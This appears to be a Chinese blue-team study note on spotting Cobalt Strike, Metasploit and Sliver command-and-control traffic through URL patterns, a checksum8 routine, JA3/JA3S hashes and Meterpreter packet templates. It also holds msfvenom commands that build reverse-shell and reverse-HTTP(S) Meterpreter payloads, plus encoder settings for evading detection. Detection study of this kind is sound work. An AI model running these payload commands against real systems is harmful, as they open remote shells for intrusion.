# 蓝队技能-流量分析篇&C2工具类&HTTPS协议&JA3&JA3S值&请求包体&MSF&CS&Sliver

```
#蓝队技能-流量分析-C2远控工具
C2:
MSF、CS、Sliver、Viper、Havoc、Vshell、Supershell等

#CS
HTTP
https://blog.didierstevens.com/didier-stevens-suite
https://github.com/DidierStevens/DidierStevensSuite
python 1768.py xxxx.vir
2、请求特征：间隔时间 URL路径 下发指令 UA头（老版本）
/cx
POST /submit.php?id=
3、路径特征：checksum8 （92L 93L）
public class EchoTest {
    public static long checksum8(String text) {
        if (text.length() < 4) {
            return 0L;
        }
        text = text.replace("/", "");
        long sum = 0L;
        for (int x = 0; x < text.length(); x++) {
            sum += text.charAt(x);
        }

        return sum % 256L;
    }

    public static void main(String[] args) throws Exception {
        System.out.println(checksum8("Yle2"));
    }
}


HTTPS：
1、证书特征(.store)
2、源码特征（ja3 ja3s）
client hello 4d5efa96609dc906f796e63cff009c2a db36bad574044a5104a59b0c676991ef
server hello 15af977ce25de452b96affa2addb1036 2253c82f03b621c5144709b393fde2c9


#MSF
1、shell模式 明文传输
msfvenom -p windows/x64/shell/reverse_tcp lhost=xx lport=6666 -f exe -o 6666.exe
特征：从数据包明文中判断命令执行

2、meterpreter模式 HTTP
msfvenom -p windows/meterpreter/reverse_http lhost=xx lport=6667 -f exe -o 6667.exe

-UA头（版本决定）
Mozilla/5.0 (

-文件头
MZ标头和DOS模式异常
set enablestageencoding true
set stageencoder x86/shikata_ga_nai

特征：固定的数据包请求和返回模版（格式一致）
request和response返回的数据包格式一致
判断数据包的请求是不是固定的几个东西
GET /xxx(不固定) HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0（固定的是Mozilla/5.0 (）
Host: xx.xx.xx.xx:xxxx
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: Keep-Alive
Server: Apache
Content-Length: 176220（不固定）

3、meterpreter模式 HTTPS
msfvenom -p windows/meterpreter_reverse_https lhost=xx lport=6669 -f exe -o 6668.exe
JA3/JA3S值：
4d93395b1c1b9ad28122fb4d09f28c5e 652358a663590cfc624787f06b82d9ae
15af977ce25de452b96affa2addb1036 2253c82f03b621c5144709b393fde2c9

#Sliver
使用视频：162课
使用参考：https://forum.butian.net/share/2243
项目下载：https://github.com/BishopFox/sliver
分析参考1：https://mp.weixin.qq.com/s/9PuyKtwY5WbjAGLbLHUmuw
分析参考2：https://mp.weixin.qq.com/s/G3ggCKxQy0nOqRuTUPHfiQ

HTTP:
路径特征：server\configs\http-c2.go
固定url路径
参数名称的构造规律
参数值的长度及规律
sessionID/Cookie的交换
Cookie的名称生成、cookie值的长度及规律

根据路径文件名，后缀，cookie这些信息到源码里面的数组随机组合配合分析排查

HTTPS:
ja3/ja3s
19e29534fd49dd27d09234e639c4057e
f4febc55ea12b31ae17cfb7e614afda8

https://github.com/salesforce/ja3
https://github.com/Macr0phag3/ja3box
d:\Python3.8\python.exe ja3.py -a https.pcapng
d:\Python3.8\python.exe ja3s.py -a https.pcapng

```

